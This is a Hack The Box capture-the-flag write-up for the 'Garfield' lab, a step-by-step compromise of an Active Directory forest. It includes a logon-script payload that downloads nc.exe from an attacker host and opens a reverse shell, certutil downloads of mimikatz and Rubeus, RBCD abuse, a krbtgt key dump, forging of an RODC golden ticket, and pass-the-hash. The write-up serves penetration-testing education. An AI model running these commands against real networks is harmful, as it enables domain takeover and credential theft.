---
title: "HTB: Garfield"
date: 2026-04-06
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - windows
  - hard
  - active-directory
  - bloodhound
  - rbcd
  - rodc
  - golden-ticket
  - ligolo
description: "Abusing AD logon scripts, RBCD against an RODC, and a KRBTGT_RODC golden ticket to fully compromise a Windows forest."
summary: "Abusing AD logon scripts, RBCD against an RODC, and a KRBTGT_RODC golden ticket to fully compromise a Windows forest."
cover:
  image: "/images/htb-garfield/info-card.png"
  alt: "HTB Garfield"
  relative: false
showToc: true
TocOpen: false
---

![HTB Garfield info card](/images/htb-garfield/info-card.png)

| OS | Difficulty | Year |
|----|------------|------|
| Windows | Hard | 2026 |

Garfield is a Windows AD box that walks through some of the more interesting RODC abuse paths. The chain hops three users by stacking object-level write rights, lateral-moves to a Read-Only Domain Controller hidden behind a Hyper-V switch, and finishes with a KRBTGT_RODC golden ticket against the writable DC.

### Kill chain

| # | Action | Result |
|---|--------|--------|
| 1 | nmap + bloodhound-python with `j.arbuckle` creds | Mapped domain, found `j.arbuckle` can write to `l.wilson` |
| 2 | Drop `printerDetect.bat` to `SYSVOL\scripts` and set it as `l.wilson`'s `scriptPath` | Reverse shell as `garfield\l.wilson` after she logs on |
| 3 | BloodHound shows `l.wilson` → `ForceChangePassword` → `l.wilson_adm` | Reset `l.wilson_adm`, WinRM in |
| 4 | `l.wilson_adm` ∈ Tier 1 → AddSelf → `RODC Administrators` → admin on `RODC01` | Pivot through Hyper-V vSwitch using ligolo-ng |
| 5 | RBCD: add fake computer, set `msDS-AllowedToActOnBehalfOfOtherIdentity` on `RODC01$` | S4U2Self/Proxy as Administrator → SYSTEM on RODC01 |
| 6 | `mimikatz lsadump::lsa /inject /name:krbtgt_8245` | Dumped the RODC's KRBTGT keys |
| 7 | Add Administrator to `msDS-RevealOnDemandGroup`, clear `msDS-NeverRevealGroup` | RODC is now allowed to forge tickets for Administrator |
| 8 | Rubeus golden TGT → `asktgs /keyList` against DC01 | Got Administrator's NT hash |
| 9 | `evil-winrm -H` as Administrator on DC01 | Domain compromise |

## Recon

### nmap

Nothing fancy on the sweep. The port list screams DC: Kerberos, LDAP, SMB, WinRM, RPC, the works.

```console
$ nmap -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389 -sV -sC 10.129.14.127
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: garfield.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows AD LDAP (Domain: garfield.htb)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
...[snip]...
| rdp-ntlm-info:
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   Product_Version: 10.0.17763
```

So `DC01.garfield.htb`, Server 2019. Box notes give us a starting credential for `j.arbuckle`, so I'll skip pre-auth tricks and go straight to authenticated enumeration.

### Active Directory - TCP 389/445

First thing I always do with a domain credential: dump everything BloodHound can see.

```console
$ bloodhound-python -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
    -ns 10.129.14.127 -dc DC01.garfield.htb -c All --zip
```

Shares are the boring default set, but `SYSVOL` is readable, which matters later.

```console
$ nxc smb 10.129.14.145 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
SMB  10.129.14.145  445  DC01  Share     Permissions  Remark
SMB  10.129.14.145  445  DC01  ADMIN$                 Remote Admin
SMB  10.129.14.145  445  DC01  C$                     Default share
SMB  10.129.14.145  445  DC01  IPC$      READ         Remote IPC
SMB  10.129.14.145  445  DC01  NETLOGON  READ         Logon server share
SMB  10.129.14.145  445  DC01  SYSVOL    READ         Logon server share
```

In BloodHound I can't find any path from `j.arbuckle` to `l.wilson` using the canned queries. BloodHound's edge detection isn't perfect, especially for object-level rights it doesn't have a query for, so I drop to bloodyAD to ask LDAP directly which objects `j.arbuckle` can write.

```console
$ bloodyAD --host 10.129.14.127 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable
distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE
...[snip]...
```

There it is. `j.arbuckle` has WRITE on the `Liz Wilson` user object. Generic write on a user is a payday. The cleanest abuse on a real engagement would be a targeted Kerberoast (set an SPN, roast it). But since BloodHound shows `l.wilson` is enabled and presumably interactive, the slicker move is to plant a logon script.

## Shell as l.wilson

Generic write means I can also write `scriptPath`. In AD, `scriptPath` is the legacy logon script attribute. The DC executes whatever path you put there (relative to `\\domain\NETLOGON\<domain>\scripts\`) as the user, on logon. Drop a payload in SYSVOL, point her account at it, wait.

I write a tiny batch file that pulls down `nc.exe` and shells back:

```bash
@echo off
certutil -urlcache -split -f http://10.10.15.229:8000/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.229 9001
```

Serve `nc.exe` and start a listener.

```console
$ python3 -m http.server 8000
$ rlwrap nc -lvnp 9001
```

Upload the batch file into SYSVOL. SYSVOL writes are replicated, but for a logon script the netlogon path is what matters.

```console
$ smbclient //10.129.14.145/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978' \
    -c 'cd garfield.htb\scripts\; put printerDetect.bat printerDetect.bat; ls'
```

Now point `l.wilson` at it. `bloodyAD set object` writes the attribute directly:

```console
$ bloodyAD --host 10.129.14.145 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
    set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v printerDetect.bat
```

Wait for the box's autologin loop to fire and the listener catches it.

![Shell as l.wilson](/images/htb-garfield/shell-as-lwilson.png)

```console
$ cat user.txt
d2c0ce66************************
```

## Shell as l.wilson_adm

Re-importing collection from the new context, BloodHound finally lights up an edge I care about: `L.WILSON` → `ForceChangePassword` → `L.WILSON_ADM`. Classic admin/user pair where the helpdesk identity is allowed to reset its own privileged twin.

![BloodHound ForceChangePassword edge](/images/htb-garfield/bloodhound-forcechangepassword.png)

From the `l.wilson` shell, drop into PowerShell and use the AD module that's already on the DC:

```console
C:\Users\l.wilson> powershell -nop -ep bypass
PS C:\Users\l.wilson> Set-ADAccountPassword -Identity "l.wilson_adm" `
    -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
```

`l.wilson_adm` is in `Remote Management Users` (you can see this in BloodHound), so WinRM is open.

```console
$ evil-winrm -i 10.129.14.145 -u l.wilson_adm -p 'WhoKnows123!'
```

![evil-winrm as l.wilson_adm](/images/htb-garfield/winrm-lwilson-adm.png)

## Shell as SYSTEM on RODC01

This is where Garfield earns its difficulty. Re-running BloodHound as `l.wilson_adm` shows the real prize: she's in `Tier 1`, which has `AddSelf` on `RODC Administrators`, and `l.wilson_adm` herself has `WriteAccountRestrictions` and `ForceChangePassword` on `RODC01`.

![BloodHound RODC01 paths](/images/htb-garfield/bloodhound-rodc-paths.png)

`RODC Administrators` is the local admin group on the RODC machine. So self-add and I'm an admin on a domain controller, just a Read-Only one.

```console
PS C:\Users\l.wilson_adm> Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

Now I need to actually reach RODC01. It isn't on the engagement subnet. `ipconfig` on DC01 shows a Hyper-V virtual switch:

```console
PS C:\Users\l.wilson_adm> ipconfig /all
...[snip]...
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
...[snip]...

PS C:\Users\l.wilson_adm> arp -a -N 192.168.100.1
  192.168.100.2         00-15-5d-0b-dd-01     dynamic
```

So `RODC01` lives at `192.168.100.2` behind DC01. Time for ligolo-ng.

```console
# attacker
$ sudo ip tuntap add user kali mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 192.168.100.0/24 dev ligolo
$ sudo ./proxy -selfcert
ligolo-ng » interface_create --name ligolo
```

Upload and run the agent on DC01 from the WinRM session, then start the session in the ligolo prompt:

```console
*Evil-WinRM* PS> upload agent.exe agent.exe
*Evil-WinRM* PS> .\agent.exe -connect 10.10.15.229:11601 -ignore-cert

ligolo-ng » session
[Use arrows to move, enter to validate] » garfield
```

Now `192.168.100.0/24` is routable from my box. Time to convert "admin on the RODC machine object" into "code execution on RODC01". Resource-Based Constrained Delegation is the cleanest way: I need a controllable service principal (any account with an SPN), so I add a fake computer.

```console
$ impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
    -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip 10.129.14.145
```

Then write `msDS-AllowedToActOnBehalfOfOtherIdentity` on `RODC01$` to allow `FAKE$` to delegate to it. `WriteAccountRestrictions` covers this attribute, which is exactly why that BloodHound edge matters.

```console
$ bloodyAD --host 10.129.14.145 -d garfield.htb -u l.wilson_adm -p 'WhoKnows123!' \
    add rbcd 'RODC01$' 'FAKE$'
```

S4U2Self + S4U2Proxy as Administrator → cifs/RODC01:

```console
$ impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator \
    -dc-ip 10.129.14.145 'garfield.htb/FAKE$:FakePass123!'
$ export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

And psexec across the ligolo tunnel using the ticket:

```console
$ impacket-psexec -k -no-pass -dc-ip 10.129.14.145 -target-ip 192.168.100.2 \
    garfield.htb/Administrator@RODC01.garfield.htb
```

![NT AUTHORITY\SYSTEM on RODC01](/images/htb-garfield/system-on-rodc01.png)

## Shell as Administrator on DC01

I'm SYSTEM on the RODC, but the RODC is read-only by design. Its KRBTGT account is a separate, scoped principal (`krbtgt_<number>`) and any tickets it issues are normally only honored if the account is in the RODC's `msDS-RevealOnDemandGroup` and not in `msDS-NeverRevealGroup`. The trick: I now have rights to edit those attributes from `l.wilson_adm`'s context, *and* I can dump the RODC's krbtgt because I'm SYSTEM on it. That combo lets me forge an RODC TGT for Administrator, then use `Rubeus asktgs /keyList` against the writable DC to swap it for Administrator's actual key.

First, dump the local krbtgt with mimikatz:

```console
PS C:\Windows\system32> certutil -urlcache -split -f http://10.10.15.229:8000/mimikatz.exe C:\Windows\Temp\mimikatz.exe
PS C:\Windows\system32> C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"

mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
...[snip]...
 * Kerberos-Newer-Keys
      aes256_hmac (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

Note the RODC number (`8245`) and the AES256 key. I'll need both for Rubeus.

Now make the writable DC trust an RODC-issued ticket for Administrator. I add Administrator to the allow list and clear the never-reveal list:

```console
$ bloodyAD --host 10.129.14.145 -d garfield.htb -u l.wilson_adm -p 'WhoKnows123!' \
    set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' \
    msDS-RevealOnDemandGroup \
    -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' \
    -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'

$ bloodyAD --host 10.129.14.145 -d garfield.htb -u l.wilson_adm -p 'WhoKnows123!' \
    set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-NeverRevealGroup
```

Forge the RODC TGT for Administrator with Rubeus:

```console
PS> certutil -urlcache -split -f http://10.10.15.229:8000/Rubeus.exe C:\Windows\Temp\Rubeus.exe
PS> C:\Windows\Temp\Rubeus.exe golden /rodcNumber:8245 `
    /flags:forwardable,renewable,enc_pa_rep `
    /outfile:C:\Windows\Temp\ticket.kirbi /user:Administrator `
    /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
    /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357

[*] Action: Build TGT
[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
...[snip]...
[*] Forged a TGT for 'Administrator@garfield.htb'
[*] Ticket written to C:\Windows\Temp\ticket_..._Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

The forged ticket on its own is technically a U2U/RODC TGT, not directly usable. But `Rubeus asktgs /keyList` will hand it to the writable DC and ask to substitute keys, which leaks Administrator's actual long-term key as a "password hash":

```console
PS> C:\Windows\Temp\Rubeus.exe asktgs /service:krbtgt/garfield.htb /dc:DC01.garfield.htb `
    /keyList /enctype:aes256 /ticket:C:\Windows\Temp\ticket_..._Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap

[*] Action: Ask TGS
[*] Requesting 'aes256_cts_hmac_sha1' etype for the service ticket
[*] Building KeyList TGS-REQ request for: 'Administrator'
[+] TGS request successful!
...[snip]...
  ServiceName              :  krbtgt/GARFIELD.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

That's Administrator's NT hash. Pass-the-hash into WinRM on the writable DC:

```console
$ evil-winrm -i 10.129.14.145 -u Administrator -H EE238F6DEBC752010428F20875B092D5
```

![Administrator shell on DC01](/images/htb-garfield/administrator-shell.png)

```console
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
80c5212a************************
```

## Credentials

| User | Password / Hash | Source |
|------|-----------------|--------|
| `j.arbuckle` | `Th1sD4mnC4t!@1978` | Provided |
| `l.wilson` | (shell via logon script, no creds dumped) | scriptPath abuse |
| `l.wilson_adm` | `WhoKnows123!` (reset) | ForceChangePassword from `l.wilson` |
| `FAKE$` | `FakePass123!` | impacket-addcomputer (MachineAccountQuota) |
| `krbtgt_8245` | NTLM `445aa4221e751da37a10241d962780e2` / AES256 `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240` | mimikatz on RODC01 |
| `Administrator` | NT `EE238F6DEBC752010428F20875B092D5` | Rubeus `asktgs /keyList` |

## Takeaways

- BloodHound's canned queries miss object-level writes that aren't in the standard edge set. When something looks empty, ask LDAP directly with `bloodyAD get writable`.
- `scriptPath` abuse is a quiet way to weaponize generic write on a user when interactive logons are happening.
- RODCs aren't a security boundary in the way people assume. Local admin on the RODC machine plus the right to flip `msDS-RevealOnDemandGroup` is effectively domain compromise via the `Rubeus golden /rodcNumber` + `asktgs /keyList` combo.
- Ligolo-ng is the cleanest way to deal with Hyper-V switch pivots. Beats SOCKS for any tooling that wants real raw sockets (impacket, nmap).
